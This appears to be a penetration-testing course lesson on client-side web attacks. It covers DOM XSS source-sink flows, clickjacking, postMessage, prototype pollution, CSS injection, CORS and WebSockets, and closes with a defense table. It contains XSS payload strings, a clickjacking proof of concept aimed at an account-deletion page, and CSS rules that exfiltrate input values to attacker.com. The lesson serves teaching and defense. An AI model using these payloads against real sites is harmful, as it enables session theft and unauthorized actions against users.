# Client-Side Attacks

**Previous**: [07. Server-Side Attacks](./07_Server_Side_Attacks.md) | **Next**: [09. Binary Fundamentals](./09_Binary_Fundamentals.md)

---

Client-side attacks exploit vulnerabilities in the user's browser and client-side code. These attacks are particularly dangerous because they target the trust relationship between users and web applications, often resulting in session theft, data exfiltration, and unauthorized actions performed on behalf of victims.

> **IMPORTANT**: All techniques described in this lesson must only be used against systems you own or have explicit written authorization to test.

**Difficulty**: ⭐⭐⭐

## Learning Objectives

1. Identify and exploit DOM-based XSS vulnerabilities
2. Create clickjacking proof-of-concept attacks
3. Exploit postMessage communication between frames
4. Understand and exploit JavaScript prototype pollution
5. Identify CORS misconfigurations for data theft
6. Exploit WebSocket connections for injection attacks
7. Understand browser security models (SOP, CSP, CORS)
8. Implement comprehensive client-side security defenses

---

## Table of Contents

1. [DOM-Based XSS Deep Dive](#1-dom-based-xss-deep-dive)
2. [Clickjacking Attacks](#2-clickjacking-attacks)
3. [Browser Exploitation Basics](#3-browser-exploitation-basics)
4. [postMessage Vulnerabilities](#4-postmessage-vulnerabilities)
5. [Prototype Pollution](#5-prototype-pollution)
6. [CSS Injection Techniques](#6-css-injection-techniques)
7. [CORS Misconfiguration Exploitation](#7-cors-misconfiguration-exploitation)
8. [WebSocket Security](#8-websocket-security)
9. [Service Worker Attacks](#9-service-worker-attacks)
10. [Client-Side Defense Strategies](#10-client-side-defense-strategies)
11. [Exercises](#11-exercises)
12. [Summary](#12-summary)
13. [References](#13-references)

---

## 1. DOM-Based XSS Deep Dive

DOM-based XSS occurs entirely in the browser when JavaScript reads data from an attacker-controllable source and passes it to a dangerous sink.

### 1.1 Sources and Sinks

**Sources** (attacker-controllable):
- `location.hash`, `location.search`, `location.href`
- `document.URL`, `document.referrer`
- `window.name`, `postMessage` data
- Web Storage (`localStorage`, `sessionStorage`)

**Sinks** (dangerous functions):
- `innerHTML`, `outerHTML`, `document.write()`
- `eval()`, `setTimeout()`, `setInterval()`
- `Function()` constructor
- `element.src`, `element.href`
- `jQuery.html()`, `jQuery.append()`

```python
"""
DOM XSS source-sink analysis framework.

Helps identify potential DOM XSS vulnerabilities
by mapping data flow from sources to sinks.
"""

from dataclasses import dataclass, field


@dataclass
class DOMFlow:
    """A data flow from source to sink in client-side JavaScript."""
    source: str
    sink: str
    severity: str
    exploitable: bool
    example_payload: str = ""
    defense: str = ""


DOM_XSS_FLOWS = [
    DOMFlow("location.hash", "innerHTML",
            "High", True,
            "#<img src=x onerror=alert(1)>",
            "Use textContent instead of innerHTML"),
    DOMFlow("location.search", "document.write()",
            "High", True,
            "?q=<script>alert(1)</script>",
            "Use DOM APIs instead of document.write"),
    DOMFlow("location.hash", "eval()",
            "Critical", True,
            "#');alert(1);//",
            "Never use eval() with user input"),
    DOMFlow("document.referrer", "innerHTML",
            "Medium", True,
            "Craft referrer with XSS payload",
            "Sanitize before DOM insertion"),
    DOMFlow("postMessage", "innerHTML",
            "High", True,
            "Send message with HTML payload",
            "Validate origin and sanitize data"),
    DOMFlow("localStorage", "innerHTML",
            "Medium", True,
            "Poison localStorage via XSS, triggers on next visit",
            "Sanitize stored data before rendering"),
]


def analyze_dom_flows() -> str:
    """Generate a DOM XSS analysis report."""
    lines = ["DOM XSS Source-Sink Analysis", "=" * 50]
    for flow in DOM_XSS_FLOWS:
        lines.append(f"\n  {flow.source} → {flow.sink}")
        lines.append(f"  Severity: {flow.severity} | Exploitable: {flow.exploitable}")
        lines.append(f"  Payload: {flow.example_payload}")
        lines.append(f"  Defense: {flow.defense}")
    return "\n".join(lines)


if __name__ == "__main__":
    print(analyze_dom_flows())
```

---

## 2. Clickjacking Attacks

Clickjacking tricks users into clicking hidden elements by overlaying transparent iframes.

### 2.1 Basic Clickjacking PoC

```html
<!-- Clickjacking proof-of-concept -->
<html>
<head><title>Click to Win!</title></head>
<body>
<h1>Click the button to claim your prize!</h1>
<div style="position: relative;">
    <!-- Visible decoy button -->
    <button style="font-size: 24px; padding: 20px;">Claim Prize</button>

    <!-- Hidden target iframe positioned over the button -->
    <iframe src="https://target.com/account/delete"
            style="position: absolute; top: 0; left: 0;
                   width: 500px; height: 200px;
                   opacity: 0.0001; z-index: 999;">
    </iframe>
</div>
</body>
</html>
```

### 2.2 Defense: X-Frame-Options and CSP

```
# Prevent framing entirely
X-Frame-Options: DENY

# Allow framing only from same origin
X-Frame-Options: SAMEORIGIN

# CSP frame-ancestors directive (modern replacement)
Content-Security-Policy: frame-ancestors 'none';
Content-Security-Policy: frame-ancestors 'self';
```

---

## 3. Browser Exploitation Basics

Modern browsers implement multiple security layers:

- **Same-Origin Policy (SOP)**: Restricts cross-origin DOM access
- **Content Security Policy (CSP)**: Controls resource loading
- **CORS**: Manages cross-origin HTTP requests
- **Sandboxing**: Isolates renderer processes
- **Site Isolation**: Separates sites into different processes

---

## 4. postMessage Vulnerabilities

`window.postMessage()` enables cross-origin communication between windows. Misuse leads to XSS and data theft.

```javascript
// VULNERABLE — no origin check
window.addEventListener("message", function(event) {
    document.getElementById("output").innerHTML = event.data; // XSS!
});

// SAFE — validate origin and sanitize
window.addEventListener("message", function(event) {
    if (event.origin !== "https://trusted.com") return;
    document.getElementById("output").textContent = event.data; // Safe
});
```

---

## 5. Prototype Pollution

Prototype pollution manipulates JavaScript's prototype chain to inject properties into all objects.

```javascript
// Pollution via __proto__
const obj = {};
obj.__proto__.isAdmin = true;

// Now ALL objects have isAdmin = true
const user = {};
console.log(user.isAdmin); // true!

// Common in libraries that deep-merge objects
// merge({}, JSON.parse('{"__proto__":{"isAdmin":true}}'))
```

---

## 6. CSS Injection Techniques

CSS injection can exfiltrate data without JavaScript:

```css
/* Attribute value exfiltration */
input[value^="a"] { background: url(https://attacker.com/?char=a); }
input[value^="b"] { background: url(https://attacker.com/?char=b); }
/* ... repeat for all characters */
```

---

## 7. CORS Misconfiguration Exploitation

```python
"""
CORS misconfiguration checker for authorized testing.
"""

from dataclasses import dataclass
from typing import Optional


@dataclass
class CORSTest:
    """CORS configuration test result."""
    url: str
    origin_tested: str
    access_control_allow_origin: str
    access_control_allow_credentials: bool
    vulnerable: bool
    description: str


CORS_TESTS = [
    ("Reflect any origin", "https://evil.com"),
    ("Null origin", "null"),
    ("Subdomain wildcard", "https://evil.target.com"),
    ("Pre-domain match", "https://target.com.evil.com"),
    ("Post-domain match", "https://eviltarget.com"),
]


def check_cors_config(
    allow_origin: str,
    allow_credentials: bool,
    tested_origin: str,
) -> tuple[bool, str]:
    """Check if CORS configuration is vulnerable."""
    if allow_origin == "*" and allow_credentials:
        return True, "Wildcard with credentials — browsers block this but config is wrong"
    if allow_origin == tested_origin and allow_credentials:
        if "evil" in tested_origin or tested_origin == "null":
            return True, f"Reflects attacker origin '{tested_origin}' with credentials"
    return False, "Configuration appears safe for this test"


if __name__ == "__main__":
    print("CORS Misconfiguration Checker")
    print("=" * 50)
    for desc, origin in CORS_TESTS:
        print(f"\n  Test: {desc}")
        print(f"  Origin: {origin}")
```

---

## 8. WebSocket Security

WebSocket connections bypass some browser security features and can be vulnerable to injection and hijacking.

### 8.1 WebSocket Issues

- No same-origin policy enforcement on initial handshake
- CSRF-like attacks on WebSocket connections
- Message injection if input is not validated
- Cross-Site WebSocket Hijacking (CSWSH)

---

## 9. Service Worker Attacks

Malicious service workers can intercept all requests from a web application, enabling persistent MITM attacks.

---

## 10. Client-Side Defense Strategies

| Attack | Defense |
|--------|---------|
| DOM XSS | Use textContent, sanitize with DOMPurify |
| Clickjacking | X-Frame-Options: DENY, CSP frame-ancestors |
| postMessage | Validate origin, sanitize data |
| Prototype pollution | Object.freeze, null prototype objects |
| CORS | Strict allow-list, never reflect arbitrary origins |
| CSP | Strict CSP with nonces, no unsafe-inline |
| WebSocket | Validate Origin header, authenticate connections |

---

## 11. Exercises

1. **DOM XSS**: Find and exploit DOM-based XSS in a practice application using source-sink analysis.
2. **Clickjacking PoC**: Create a clickjacking attack against a site without frame protection.
3. **CORS Testing**: Test a web application's CORS configuration using the test matrix above.
4. **postMessage**: Exploit a vulnerable postMessage handler to achieve XSS.
5. **CSP Bypass**: Given a CSP policy, find ways to execute JavaScript despite restrictions.
6. **Defense**: Implement comprehensive client-side security headers for a Flask application.

---

## 12. Summary

Client-side attacks exploit the browser as an attack vector:

- **DOM XSS** flows from attacker-controlled sources to dangerous sinks
- **Clickjacking** overlays invisible frames to trick user clicks
- **postMessage** enables cross-origin data theft when origins aren't validated
- **Prototype pollution** poisons JavaScript's prototype chain
- **CORS misconfigurations** allow cross-origin data theft
- Defense requires Content Security Policy, proper headers, and input sanitization

---

## 13. References

- PortSwigger DOM XSS: https://portswigger.net/web-security/cross-site-scripting/dom-based
- PortSwigger Clickjacking: https://portswigger.net/web-security/clickjacking
- DOMPurify: https://github.com/cure53/DOMPurify
- CSP Evaluator: https://csp-evaluator.withgoogle.com/
